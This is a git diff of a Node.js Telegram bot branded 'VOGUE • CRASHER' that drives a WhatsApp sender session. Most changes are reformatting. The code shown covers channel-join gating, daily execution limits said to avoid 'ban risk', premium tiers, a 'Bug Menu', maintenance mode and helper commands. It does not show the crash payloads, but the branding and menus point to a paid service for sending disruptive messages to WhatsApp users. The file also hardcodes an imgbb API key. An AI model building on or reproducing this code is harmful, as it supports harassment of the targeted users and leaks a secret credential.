@@ -102,7 +102,6 @@ const makeInMemoryStore = ({ logger = console } = {}) => {
         logger
     }
 }
-
 const question = (query) => new Promise((resolve) => {
     const rl = require('readline').createInterface({
         input: process.stdin,
@@ -113,9 +112,7 @@ const question = (query) => new Promise((resolve) => {
         resolve(answer);
     });
 });
-
 const thumbnailUrl = "https://files.catbox.moe/eyhahn.png";
-
 const bot = new Telegraf(tokenBot);
 let sock = null;
 let isWhatsAppConnected = false;
@@ -125,9 +122,7 @@ const usePairingCode = true;
 const lastClaim = new Map();
 const messageLog = new Map();
 let restarting = false;
-
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-
 const requiredChannel = "@VogueOfficialx";
 const premiumFile = './database/premium.json';
 const premiumGroupFile = './database/premiumgroup.json';
@@ -136,6 +131,10 @@ const activeAnimatedMenus = new Map();
 const lockedMenus = new Set();
 const styleCycle = ["primary", "success", "danger"];
 let currentStyleIndex = 0;
+let reconnecting = false;
+let pingInterval = null;
+let reconnectTimeout = null;
+let socketStarted = false;
 
 const loadClaimed = () => {
     try {
@@ -250,22 +249,38 @@ This feature is restricted to premium users or premium groups.`
     );
 }
 
-// ========================================
-// SOCKET STABILITY SYSTEM
-// ========================================
-
-let reconnecting = false;
-let pingInterval = null;
-let reconnectTimeout = null;
-let socketStarted = false;
+//     _____  _____ _____  _   __ _____ _____                
+//    /  ___||  _  /  __ \| | / /|  ___|_   _|               
+//    \ `--. | | | | /  \/| |/ / | |__   | |                 
+//     `--. \| | | | |    |    \ |  __|  | |                 
+//    /\__/ /\ \_/ / \__/\| |\  \| |___  | |                 
+//    \____/  \___/ \____/\_| \_/\____/  \_/                 
+//                                                           
+//                                                           
+//     _____ _____ ___  ______ _____ _     _____ _______   __
+//    /  ___|_   _/ _ \ | ___ \_   _| |   |_   _|_   _\ \ / /
+//    \ `--.  | |/ /_\ \| |_/ / | | | |     | |   | |  \ V / 
+//     `--. \ | ||  _  || ___ \ | | | |     | |   | |   \ /  
+//    /\__/ / | || | | || |_/ /_| |_| |_____| |_  | |   | |  
+//    \____/  \_/\_| |_/\____/ \___/\_____/\___/  \_/   \_/  
+//                                                           
+//                                                           
+//     _______   _______ _____ ________  ___                 
+//    /  ___\ \ / /  ___|_   _|  ___|  \/  |                 
+//    \ `--. \ V /\ `--.  | | | |__ | .  . |                 
+//     `--. \ \ /  `--. \ | | |  __|| |\/| |                 
+//    /\__/ / | | /\__/ / | | | |___| |  | |                 
+//    \____/  \_/ \____/  \_/ \____/\_|  |_/                 
+//                                                           
+//                                                           
 
 function clearSocketIntervals() {
-
+    
     if (pingInterval) {
         clearInterval(pingInterval);
         pingInterval = null;
     }
-
+    
     if (reconnectTimeout) {
         clearTimeout(reconnectTimeout);
         reconnectTimeout = null;
@@ -273,25 +288,25 @@ function clearSocketIntervals() {
 }
 
 async function destroySocket() {
-
+    
     try {
-
+        
         clearSocketIntervals();
-
+        
         if (sock?.ws) {
             try {
                 sock.ws.close();
             } catch {}
         }
-
+        
         try {
             sock.end();
         } catch {}
-
+        
         try {
             sock.ev.removeAllListeners();
         } catch {}
-
+        
     } catch (e) {}
 }
 
@@ -351,28 +366,28 @@ const startSesi = async () => {
     clearSocketIntervals();
     
     pingInterval = setInterval(() => {
-    
+        
         try {
-    
+            
             if (
                 sock &&
                 sock.ws &&
                 sock.ws.readyState === 1
             ) {
-    
+                
                 sock.ws.send(
                     JSON.stringify({
                         type: "ping"
                     })
                 );
-    
+                
                 console.log(
                     "[VOGUE] Heartbeat Ping"
                 );
             }
-    
+            
         } catch {}
-    
+        
     }, 15000);
     
     sock.ev.on("messages.upsert", async ({ messages }) => {
@@ -395,7 +410,7 @@ const startSesi = async () => {
         });
         
     });
-   
+    
     
     sock.ev.on('creds.update', saveCreds);
     store.bind(sock.ev);
@@ -461,27 +476,27 @@ The sender session has been successfully initialized and is ready for use.
   `))
             pingInterval = setInterval(() => {
                 try {
-            
+                    
                     if (
                         sock &&
                         sock.ws &&
                         sock.ws.readyState === 1
                     ) {
-            
+                        
                         sock.sendPresenceUpdate("available");
-            
+                        
                         console.log(
                             "[VOGUE] Presence KeepAlive"
                         );
                     }
-            
+                    
                 } catch {}
-            
+                
             }, 20000);
         }
         
         if (connection === 'close') {
-    
+            
             isWhatsAppConnected = false;
             
             const statusCode =
@@ -535,22 +550,22 @@ The sender session has been successfully initialized and is ready for use.
         
         Starting fresh session...
         `);
-            
-            reconnecting = false;
-            
-            startSesi();
-            
-        } catch (err) {
-            
-            reconnecting = false;
-            
-            console.log(
-                `[RECONNECT ERROR] ${err.message}`
-            );
+                    
+                    reconnecting = false;
+                    
+                    startSesi();
+                    
+                } catch (err) {
+                    
+                    reconnecting = false;
+                    
+                    console.log(
+                        `[RECONNECT ERROR] ${err.message}`
+                    );
+                }
+                
+            }, 5000);
         }
-        
-    }, 5000);
-}
     });
 };
 
@@ -594,67 +609,64 @@ const REQUIRED_CHANNELS = [
 ];
 
 async function checkChannelMembership(ctx) {
-
+    
     try {
-
+        
         const notJoined = [];
-
+        
         for (const channel of REQUIRED_CHANNELS) {
-
+            
             try {
-
+                
                 const member =
                     await ctx.telegram.getChatMember(
                         channel,
                         ctx.from.id
                     );
-
+                
                 const status = member.status;
-
+                
                 const allowed = [
                     "creator",
                     "administrator",
                     "member"
                 ];
-
+                
                 if (!allowed.includes(status)) {
                     notJoined.push(channel);
                 }
-
+                
             } catch {
-
+                
                 notJoined.push(channel);
             }
         }
-
+        
         if (notJoined.length > 0) {
-
+            
             const buttons = [];
-
+            
             // CHANNEL BUTTONS
             for (const channel of REQUIRED_CHANNELS) {
-
+                
                 buttons.push([
-                    {
-                        text: `Join ${channel}`,
-                        url: `https://t.me/${channel.replace("@", "")}`
-                    }
-                ]);
+                {
+                    text: `Join ${channel}`,
+                    url: `https://t.me/${channel.replace("@", "")}`
+                }]);
             }
-
+            
             // CHECK BUTTON
             buttons.push([
-                {
-                    text: "I've Joined",
-                    callback_data: "recheck_join"
-                }
-            ]);
-
+            {
+                text: "I've Joined",
+                callback_data: "recheck_join"
+            }]);
+            
             await ctx.replyWithPhoto(
                 thumbnailUrl,
                 {
-                    caption:
-`<pre>
+                    caption: `<pre>
 V O G U E  •  V E R I F I C A T I O N
 ──────────────────────────
 
@@ -673,74 +685,74 @@ After joining all channels,
 press the verification button below.
 </pre>`,
                     parse_mode: "HTML",
-
+                    
                     reply_markup: {
                         inline_keyboard: buttons
                     }
                 }
             );
-
+            
             return false;
         }
-
+        
         return true;
-
+        
     } catch (err) {
-
+        
         console.log(
             `[JOIN CHECK ERROR] ${err.message}`
         );
-
+        
         return false;
     }
 }
 
 bot.use(async (ctx, next) => {
-
+    
     if (ctx.from?.id == ownerID) {
         return next();
     }
-
+    
     if (!ctx.from) {
         return;
     }
-
+    
     const allowed =
         await checkChannelMembership(ctx);
-
+    
     if (!allowed) {
         return;
     }
-
+    
     return next();
 });
 
 bot.action(
     "recheck_join",
     async (ctx) => {
-
+        
         const allowed =
             await checkChannelMembership(ctx);
-
+        
         if (allowed) {
-
+            
             await ctx.answerCbQuery(
                 "Verification successful"
             );
-
+            
             try {
-
+                
                 await ctx.deleteMessage();
-
+                
             } catch {}
-
+            
             return ctx.reply(
-`Access Granted
+                `Access Granted
 
 You can now use the bot normally.`
             );
         }
-
+        
         return ctx.answerCbQuery(
             "You have not joined all channels yet",
             {
@@ -773,7 +785,7 @@ const LIMIT_FILE =
 let userLimits = {};
 
 if (fs.existsSync(LIMIT_FILE)) {
-
+    
     userLimits =
         JSON.parse(
             fs.readFileSync(
@@ -783,7 +795,7 @@ if (fs.existsSync(LIMIT_FILE)) {
 }
 
 function saveLimits() {
-
+    
     fs.writeFileSync(
         LIMIT_FILE,
         JSON.stringify(
@@ -795,45 +807,44 @@ function saveLimits() {
 }
 
 function getToday() {
-
+    
     return new Date()
         .toISOString()
         .split("T")[0];
 }
 
 function checkUserLimit(userId) {
-
+    
     const today = getToday();
-
+    
     if (!userLimits[userId]) {
-
+        
         userLimits[userId] = {
-
+            
             date: today,
-
+            
             used: 0,
-
+            
             bonus: 0
         };
     }
-
+    
     // RESET HARIAN
     if (
         userLimits[userId].date !== today
     ) {
-
+        
         userLimits[userId] = {
-
+            
             date: today,
-
+            
             used: 0,
-
-            bonus:
-                userLimits[userId]
+            
+            bonus: userLimits[userId]
                 ?.bonus || 0
         };
     }
-
+    
     // TOTAL LIMIT
     const maxLimit =
         15 +
@@ -841,169 +852,151 @@ function checkUserLimit(userId) {
             userLimits[userId]
             .bonus || 0
         );
-
+    
     // LIMIT HABIS
     if (
         userLimits[userId].used >=
         maxLimit
     ) {
-
+        
         return {
-
+            
             allowed: false,
-
+            
             remaining: 0,
-
-            used:
-                userLimits[userId]
+            
+            used: userLimits[userId]
                 .used,
-
-            total:
-                maxLimit
+            
+            total: maxLimit
         };
     }
-
+    
     return {
-
+        
         allowed: true,
-
-        remaining:
-            maxLimit -
+        
+        remaining: maxLimit -
             userLimits[userId]
             .used,
-
-        used:
-            userLimits[userId]
+        
+        used: userLimits[userId]
             .used,
-
-        total:
-            maxLimit
+        
+        total: maxLimit
     };
 }
 
-
 function addUserLimit(userId) {
-
+    
     const today = getToday();
-
+    
     if (!userLimits[userId]) {
-
+        
         userLimits[userId] = {
-
+            
             date: today,
-
+            
             used: 0,
-
+            
             bonus: 0
         };
     }
-
+    
     // RESET HARIAN
     if (
         userLimits[userId].date !== today
     ) {
-
+        
         userLimits[userId] = {
-
+            
             date: today,
-
+            
             used: 0,
-
-            bonus:
-                userLimits[userId]
+            
+            bonus: userLimits[userId]
                 ?.bonus || 0
         };
     }
-
+    
     userLimits[userId].used += 1;
-
+    
     saveLimits();
 }
 
-function addBonusLimit(
-    userId,
-    amount
-) {
-
+function addBonusLimit(userId, amount) {
+    
     const today = getToday();
-
+    
     if (!userLimits[userId]) {
-
+        
         userLimits[userId] = {
-
+            
             date: today,
-
+            
             used: 0,
-
+            
             bonus: 0
         };
     }
-
+    
     if (
         !userLimits[userId].bonus
     ) {
-
+        
         userLimits[userId].bonus = 0;
     }
-
+    
     userLimits[userId].bonus += amount;
-
+    
     saveLimits();
 }
 
-function removeBonusLimit(
-    userId,
-    amount
-) {
-
+function removeBonusLimit(userId, amount) {
+    
     if (!userLimits[userId]) {
         return false;
     }
-
+    
     if (
         !userLimits[userId].bonus
     ) {
-
+        
         userLimits[userId].bonus = 0;
     }
-
+    
     userLimits[userId].bonus -= amount;
-
+    
     if (
         userLimits[userId].bonus < 0
     ) {
-
+        
         userLimits[userId].bonus = 0;
     }
-
+    
     saveLimits();
-
+    
     return true;
 }
 
-
-async function checkExecutionLimit(
-    ctx,
-    next
-) {
-
+async function checkExecutionLimit(ctx, next) {
+    
     if (ctx.from.id == ownerID) {
         return next();
     }
-
+    
     const userId =
         String(ctx.from.id);
-
+    
     const limit =
         checkUserLimit(userId);
-
+    
     if (!limit.allowed) {
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`<pre>
+                caption: `<pre>
 V O G U E  •  C R A S H E R
 ──────────────────────────
 
@@ -1018,60 +1011,59 @@ Limit will reset automatically tomorrow.
 To avoid sender overload and ban risk.
 </pre>`,
                 parse_mode: "HTML",
-
+                
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            {
-                                text: "Developer",
-                                url: "https://t.me/ScriptKits",
-                                style: "danger"
-                            }
-                        ]
+                        {
+                            text: "Developer",
+                            url: "https://t.me/ScriptKits",
+                            style: "danger"
+                        }]
                     ]
                 }
             }
         );
     }
-
+    
     addUserLimit(userId);
-
+    
     return next();
 }
 
 bot.command("addlimit", async (ctx) => {
-
+    
     try {
-
+        
         if (ctx.from.id != ownerID) {
             return ctx.reply("Owner only.");
         }
-
+        
         const args = ctx.message.text.split(" ");
-
+        
         let targetUserId;
         let targetName;
         let amount;
-
+        
         if (ctx.message.reply_to_message) {
-
+            
             targetUserId = String(
                 ctx.message.reply_to_message.from.id
             );
-
+            
             targetName =
                 ctx.message.reply_to_message.from.first_name;
-
+            
             amount = parseInt(args[1]);
-
+            
         }
-
+        
         else {
-
+            
             if (!args[1] || !args[2]) {
-
+                
                 return ctx.reply(
-`Usage:
+                    `Usage:
 /addlimit <id> <amount>
 
 /addlimit 123456789 10
@@ -1080,36 +1072,35 @@ Or reply user:
 /addlimit 10`
                 );
             }
-
+            
             targetUserId =
                 args[1].replace("@", "");
-
+            
             targetName = args[1];
-
+            
             amount = parseInt(args[2]);
         }
-
-
+        
+        
         if (!amount || amount < 1) {
             return ctx.reply(
                 "Invalid limit amount."
             );
         }
-
+        
         addBonusLimit(
             targetUserId,
             amount
         );
-
+        
         const data = checkUserLimit(
             targetUserId
         );
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`
+                caption: `
 <pre>
 V O G U E • LIMIT MANAGER
 ────────────────────────
@@ -1136,11 +1127,11 @@ User limit updated successfully.
                 parse_mode: "HTML"
             }
         );
-
+        
     } catch (err) {
-
+        
         console.log(err);
-
+        
         return ctx.reply(
             "Failed to add limit."
         );
@@ -1148,77 +1139,76 @@ User limit updated successfully.
 });
 
 bot.command("remlimit", async (ctx) => {
-
+    
     try {
-
+        
         if (ctx.from.id != ownerID) {
             return ctx.reply("Owner only.");
         }
-
+        
         const args = ctx.message.text.split(" ");
-
+        
         let targetUserId;
         let targetName;
         let amount;
-
+        
         if (ctx.message.reply_to_message) {
-
+            
             targetUserId = String(
                 ctx.message.reply_to_message.from.id
             );
-
+            
             targetName =
                 ctx.message.reply_to_message.from.first_name;
-
+            
             amount = parseInt(args[1]);
-
+            
         }
-
+        
         else {
-
+            
             if (!args[1] || !args[2]) {
-
+                
                 return ctx.reply(
-`Usage:
+                    `Usage:
 /remlimit <id> <amount>`
                 );
             }
-
+            
             targetUserId =
                 args[1].replace("@", "");
-
+            
             targetName = args[1];
-
+            
             amount = parseInt(args[2]);
         }
-
+        
         if (!amount || amount < 1) {
             return ctx.reply(
                 "Invalid amount."
             );
         }
-
+        
         const removed =
             removeBonusLimit(
                 targetUserId,
                 amount
             );
-
+        
         if (!removed) {
             return ctx.reply(
                 "User not found."
             );
         }
-
+        
         const data = checkUserLimit(
             targetUserId
         );
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`
+                caption: `
 <pre>
 V O G U E • LIMIT MANAGER
 ────────────────────────
@@ -1242,11 +1232,11 @@ User bonus limit updated.
                 parse_mode: "HTML"
             }
         );
-
+        
     } catch (err) {
-
+        
         console.log(err);
-
+        
         return ctx.reply(
             "Failed to remove limit."
         );
@@ -1254,51 +1244,50 @@ User bonus limit updated.
 });
 
 bot.command("checklimit", async (ctx) => {
-
+    
     try {
-
+        
         const args =
             ctx.message.text.split(" ");
-
+        
         let targetUserId;
         let targetName;
-
+        
         if (ctx.message.reply_to_message) {
-
+            
             targetUserId = String(
                 ctx.message.reply_to_message.from.id
             );
-
+            
             targetName =
                 ctx.message.reply_to_message.from.first_name;
         }
-
+        
         else if (!args[1]) {
-
+            
             targetUserId =
                 String(ctx.from.id);
-
+            
             targetName =
                 ctx.from.first_name;
         }
-
+        
         else {
-
+            
             targetUserId =
                 args[1].replace("@", "");
-
+            
             targetName = args[1];
         }
-
+        
         const data = checkUserLimit(
             targetUserId
         );
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`
+                caption: `
 <pre>
 V O G U E • LIMIT CHECKER
 ────────────────────────
@@ -1325,11 +1314,11 @@ Daily limit information.
                 parse_mode: "HTML"
             }
         );
-
+        
     } catch (err) {
-
+        
         console.log(err);
-
+        
         return ctx.reply(
             "Failed to check limit."
         );
@@ -1394,9 +1383,8 @@ Framework   : Javascript
     
 });
 
-
 bot.action('/start', async (ctx) => {
-
+    
     const menuMessage = `
 <pre>
 V O G U E  •  C R A S H E R
@@ -1419,63 +1407,59 @@ All operations are monitored and executed through the central dispatch system.
 
 Select one of the available options below to continue system interaction.
 </pre>`;
-
+    
     const keyboard = [
         [
-            {
-                text: "All Menu",
-                callback_data: "/controls"
-            },
-            {
-                text: "Bug Menu",
-                callback_data: "/bug"
-            }
-        ],
+        {
+            text: "All Menu",
+            callback_data: "/controls"
+        },
+        {
+            text: "Bug Menu",
+            callback_data: "/bug"
+        }],
         [
-            {
-                text: "Developer",
-                callback_data: "/tqto"
-            }
-        ],
+        {
+            text: "Developer",
+            callback_data: "/tqto"
+        }],
         [
-            {
-                text: "🎁 Free 1 Day Premium",
-                callback_data: "free_premium_info"
-            }
-        ]
+        {
+            text: "🎁 Free 1 Day Premium",
+            callback_data: "free_premium_info"
+        }]
     ];
-
+    
     try {
-
+        
         const sent = await ctx.editMessageMedia(
-            {
-                type: 'photo',
-                media: thumbnailUrl,
-                caption: menuMessage,
-                parse_mode: "HTML",
-                message_effect_id: "5104841245755180586",
-            },
-            {
-                reply_markup: {
-                    inline_keyboard: keyboard
-                }
+        {
+            type: 'photo',
+            media: thumbnailUrl,
+            caption: menuMessage,
+            parse_mode: "HTML",
+            message_effect_id: "5104841245755180586",
+        },
+        {
+            reply_markup: {
+                inline_keyboard: keyboard
             }
-        );
+        });
         
         
     } catch (error) {
-
+        
         if (
             error.response &&
             error.response.error_code === 400 &&
             error.response.description ===
             "Bad Request: message is not modified"
         ) {
-
+            
             await ctx.answerCbQuery();
-
+            
         } else {
-
+            
             console.log(
                 `[START ERROR] ${error.message}`
             );
@@ -1571,7 +1555,6 @@ One-time reward activated.
         );
     }
 });
-
 
 bot.action('/controls', async (ctx) => {
     const controlsMenu = `
@@ -1957,13 +1940,13 @@ process has been completed.
 
 
 bot.use(async (ctx, next) => {
-
+    
     if (ctx.from?.id == ownerID) {
         return next();
     }
-
+    
     if (maintenanceMode) {
-
+        
         if (ctx.callbackQuery) {
             return ctx.answerCbQuery(
                 "System under maintenance.",
@@ -1972,43 +1955,40 @@ bot.use(async (ctx, next) => {
                 }
             );
         }
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
                 caption: maintenanceMessage,
                 parse_mode: "HTML",
-
+                
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            {
-                                text: "Developer",
-                                url: "https://t.me/ScriptKits",
-                                style: "danger"
-                            }
-                        ],
+                        {
+                            text: "Developer",
+                            url: "https://t.me/ScriptKits",
+                            style: "danger"
+                        }],
                         [
-                            {
-                                text: "System Status",
-                                callback_data: "maintenance_status",
-                                style: "danger"
-                            }
-                        ]
+                        {
+                            text: "System Status",
+                            callback_data: "maintenance_status",
+                            style: "danger"
+                        }]
                     ]
                 }
             }
         );
     }
-
+    
     return next();
 });
-
 
 bot.action(
     "maintenance_status",
     async (ctx) => {
-
+        
         return ctx.answerCbQuery(
             "Maintenance currently active.",
             {
@@ -2021,15 +2001,15 @@ bot.action(
 bot.command(
     "maintenance",
     async (ctx) => {
-
+        
         if (ctx.from.id != ownerID) {
             return;
         }
-
+        
         maintenanceMode = true;
-
+        
         return ctx.reply(
-`<pre>
+            `<pre>
 V O G U E  •  C R A S H E R
 ──────────────────────────
 
@@ -2051,15 +2031,15 @@ Public access has been disabled.
 bot.command(
     "unmaintenance",
     async (ctx) => {
-
+        
         if (ctx.from.id != ownerID) {
             return;
         }
-
+        
         maintenanceMode = false;
-
+        
         return ctx.reply(
-`<pre>
+            `<pre>
 V O G U E  •  C R A S H E R
 ──────────────────────────
 
@@ -2093,7 +2073,7 @@ System access has been restored.
 //    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
 //     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
 //                                                    
-//                                                    :
+//                                                    
 
 bot.command('addprem', async (ctx) => {
     if (ctx.from.id != ownerID) {
@@ -2339,12 +2319,12 @@ from this group.
 //
 
 bot.command("sticker", async (ctx) => {
-
+    
     try {
-
+        
         const reply =
             ctx.message.reply_to_message;
-
+        
         if (
             !reply ||
             (
@@ -2354,20 +2334,19 @@ bot.command("sticker", async (ctx) => {
                 !reply.animation
             )
         ) {
-
+            
             return ctx.reply(
-`Invalid Format
+                `Invalid Format
 
 Reply image / gif / video with:
 /sticker`
             );
         }
-
+        
         const loading = await ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`
+                caption: `
 <pre>
 V O G U E • STICKER ENGINE
 ──────────────────────────
@@ -2381,52 +2360,52 @@ Converting media to sticker...
                 parse_mode: "HTML"
             }
         );
-
+        
         let fileId;
         let isVideo = false;
-
+        
         if (reply.photo) {
-
+            
             fileId =
                 reply.photo[
                     reply.photo.length - 1
                 ].file_id;
         }
-
+        
         else if (reply.document) {
-
+            
             fileId =
                 reply.document.file_id;
-
+            
             if (
                 reply.document.mime_type?.includes("video")
             ) {
                 isVideo = true;
             }
         }
-
+        
         else if (reply.video) {
-
+            
             fileId =
                 reply.video.file_id;
-
+            
             isVideo = true;
         }
-
+        
         else if (reply.animation) {
-
+            
             fileId =
                 reply.animation.file_id;
-
+            
             isVideo = true;
         }
-
+        
         const file =
             await ctx.telegram.getFile(fileId);
-
+        
         const fileUrl =
-`https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
-
+            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
+        
         const response =
             await axios.get(
                 fileUrl,
@@ -2434,41 +2413,38 @@ Converting media to sticker...
                     responseType: "arraybuffer"
                 }
             );
-
+        
         const buffer =
             Buffer.from(response.data);
-
+        
         if (isVideo) {
-
+            
             await ctx.replyWithSticker(
-                {
-                    source: buffer
-                }
-            );
-
+            {
+                source: buffer
+            });
+            
         } else {
-
+            
             await ctx.replyWithSticker(
-                {
-                    source: buffer
-                }
-            );
+            {
+                source: buffer
+            });
         }
-
+        
         await ctx.telegram.deleteMessage(
             ctx.chat.id,
             loading.message_id
         );
-
+        
     } catch (err) {
-
+        
         console.log(err);
-
+        
         return ctx.replyWithPhoto(
             thumbnailUrl,
             {
-                caption:
-`
+                caption: `
 <pre>
 V O G U E • STICKER ENGINE
 ──────────────────────────
@@ -2487,14 +2463,14 @@ to sticker format.
 });
 
 bot.command("tourl", async (ctx) => {
-
+    
     try {
         const apiKey =
             "8f2a09515256735774c3d906b6c997f9";
-
+        
         const reply =
             ctx.message.reply_to_message;
-
+        
         if (
             !reply ||
             (
@@ -2503,43 +2479,42 @@ bot.command("tourl", async (ctx) => {
                 !reply.sticker
             )
         ) {
-
+            
             return ctx.reply(
-`Reply image/sticker/document
+                `Reply image/sticker/document
 
 Usage:
 /tourl`
             );
         }
-
+        
         let fileId;
-
+        
         if (reply.photo) {
-
+            
             fileId =
                 reply.photo[
                     reply.photo.length - 1
                 ].file_id;
         }
-
+        
         else if (reply.document) {
-
+            
             fileId =
                 reply.document.file_id;
         }
-
+        
         else if (reply.sticker) {
-
+            
             fileId =
                 reply.sticker.file_id;
         }
-
+        
         const loading =
             await ctx.replyWithPhoto(
                 thumbnailUrl,
                 {
-                    caption:
-`
+                    caption: `
 <pre>
 V O G U E • TO URL
 ────────────────────────
@@ -2553,29 +2528,29 @@ Please wait.
                     parse_mode: "HTML"
                 }
             );
-
+        
         const file =
             await ctx.telegram.getFile(fileId);
-
+        
         const fileUrl =
             `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
-
+        
         const response =
             await axios.get(fileUrl, {
                 responseType: "arraybuffer"
             });
-
+        
         const buffer =
             Buffer.from(response.data);
-
+        
         const form =
             new FormData();
-
+        
         form.append(
             "image",
             buffer.toString("base64")
         );
-
+        
         const upload =
             await axios.post(
                 `https://api.imgbb.com/1/upload?key=${apiKey}`,
@@ -2584,26 +2559,26 @@ Please wait.
                     headers: form.getHeaders()
                 }
             );
-
+        
         const result =
             upload.data;
-
+        
         if (!result.success) {
-
+            
             return ctx.reply(
                 "Upload failed."
             );
         }
-
+        
         const data =
             result.data;
-
+        
         await ctx.telegram.editMessageCaption(
             ctx.chat.id,
             loading.message_id,
             undefined,
-
-`
+            
+            `
 <pre>
 V O G U E • TO URL
 ────────────────────────
@@ -2633,32 +2608,30 @@ ${data.url_viewer}
 `,
             {
                 parse_mode: "HTML",
-
+                
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            {
-                                text: "Open Image",
-                                url: data.url,
-                                style: "primary"
-                            }
-                        ],
+                        {
+                            text: "Open Image",
+                            url: data.url,
+                            style: "primary"
+                        }],
                         [
-                            {
-                                text: "Viewer Link",
-                                url: data.url_viewer,
-                                style: "success"
-                            }
-                        ]
+                        {
+                            text: "Viewer Link",
+                            url: data.url_viewer,
+                            style: "success"
+                        }]
                     ]
                 }
             }
         );
-
+        
     } catch (err) {
-
+        
         console.log(err);
-
+        
         return ctx.reply(
             "Failed to upload media."
         );
@@ -2666,19 +2639,19 @@ ${data.url_viewer}
 });
 
 bot.command("update", async (ctx) => {
-
+    
     if (ctx.from.id != ownerID) {
         return ctx.reply(
-`Access Denied
+            `Access Denied
 
 This command is restricted to the system owner.`
         );
     }
-
+    
     const { exec } = require("child_process");
-
+    
     const msg = await ctx.reply(
-`<pre>
+        `<pre>
 V O G U E  •  U P D A T E
 ──────────────────────────
 
@@ -2687,48 +2660,45 @@ Fetching latest commit...
 Preparing update process...
 
 Status : RUNNING
-</pre>`,
-        { parse_mode: "HTML" }
+</pre>`, { parse_mode: "HTML" }
     );
-
+    
     exec("git pull", async (error, stdout, stderr) => {
-
+        
         if (error) {
             return ctx.telegram.editMessageText(
                 ctx.chat.id,
                 msg.message_id,
                 null,
-`<pre>
+                `<pre>
 V O G U E  •  U P D A T E
 ──────────────────────────
 
 Update Failed
 
 ${error.message}
-</pre>`,
-                { parse_mode: "HTML" }
+</pre>`, { parse_mode: "HTML" }
             );
         }
-
+        
         await ctx.telegram.editMessageText(
             ctx.chat.id,
             msg.message_id,
             null,
-`<pre>
+            `<pre>
 V O G U E  •  U P D A T E
 ──────────────────────────
 
 Repository updated successfully
 
 ${stdout}
-</pre>`,
-            { parse_mode: "HTML" }
+</pre>`, { parse_mode: "HTML" }
         );
-
+        
         process.exit(0);
-
+        
     });
-
+    
 });
 
 bot.command('restartbot', async (ctx) => {
@@ -2907,41 +2877,41 @@ the current session data.
 });
 
 bot.command("info", async (ctx) => {
-
+    
     const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
     const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
     const usedRam = (totalRam - freeRam).toFixed(2);
-
+    
     const uptime = process.uptime();
-
+    
     const days = Math.floor(uptime / 86400);
     const hours = Math.floor((uptime % 86400) / 3600);
     const minutes = Math.floor((uptime % 3600) / 60);
     const seconds = Math.floor(uptime % 60);
-
+    
     const runtime =
         `${days}d ${hours}h ${minutes}m ${seconds}s`;
-
+    
     const cpuModel = os.cpus()[0].model;
     const cpuCores = os.cpus().length;
     const cpuArch = os.arch();
     const cpuLoad = os.loadavg()[0].toFixed(2);
-
+    
     const platform = os.platform();
     const hostname = os.hostname();
-
+    
     const senderStatus =
-        isWhatsAppConnected
-            ? "Connected"
-            : "Disconnected";
-
+        isWhatsAppConnected ?
+        "Connected" :
+        "Disconnected";
+    
     const currentTime = moment()
         .tz("Asia/Jakarta")
         .format("DD/MM/YYYY HH:mm:ss");
-
+    
     const pages = [
-
-`<pre>
+        
+        `<pre>
 ┏━ V O G U E • I N F O ━┓
 
 ⌬ BOT INFORMATION
@@ -2969,8 +2939,8 @@ bot.command("info", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ W H A T S A P P ━┓
 
 ⌬ CONNECTION INFORMATION
@@ -2992,8 +2962,8 @@ bot.command("info", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ V P S • I N F O ━┓
 
 ⌬ SERVER INFORMATION
@@ -3018,8 +2988,8 @@ bot.command("info", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ R A M • U S A G E ━┓
 
 ⌬ MEMORY INFORMATION
@@ -3046,93 +3016,92 @@ or service failure.
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`
-
+        
     ];
-
+    
     let currentPage = 0;
-
+    
     const keyboard = (page) => ({
         inline_keyboard: [
             [
-                {
-                    text: "◀ Back",
-                    callback_data: `info_back_${page}`
-                },
-                {
-                    text: `${page + 1}/${pages.length}`,
-                    callback_data: "info_page"
-                },
-                {
-                    text: "Next ▶",
-                    callback_data: `info_next_${page}`
-                }
-            ]
+            {
+                text: "◀ Back",
+                callback_data: `info_back_${page}`
+            },
+            {
+                text: `${page + 1}/${pages.length}`,
+                callback_data: "info_page"
+            },
+            {
+                text: "Next ▶",
+                callback_data: `info_next_${page}`
+            }]
         ]
     });
-
+    
     await ctx.replyWithPhoto(thumbnailUrl, {
         caption: pages[currentPage],
         parse_mode: "HTML",
         reply_markup: keyboard(currentPage)
     });
-
+    
 });
 
 bot.on("callback_query", async (ctx) => {
-
+    
     const data = ctx.callbackQuery.data;
-
+    
     if (!data.startsWith("info_")) return;
-
+    
     const totalPages = 4;
-
+    
     let page = parseInt(data.split("_")[2]);
-
+    
     if (data.startsWith("info_next")) {
         page = (page + 1) % totalPages;
     }
-
+    
     if (data.startsWith("info_back")) {
         page = (page - 1 + totalPages) % totalPages;
     }
-
+    
     const os = require("os");
     const moment = require("moment-timezone");
-
+    
     const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
     const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
     const usedRam = (totalRam - freeRam).toFixed(2);
-
+    
     const uptime = process.uptime();
-
+    
     const days = Math.floor(uptime / 86400);
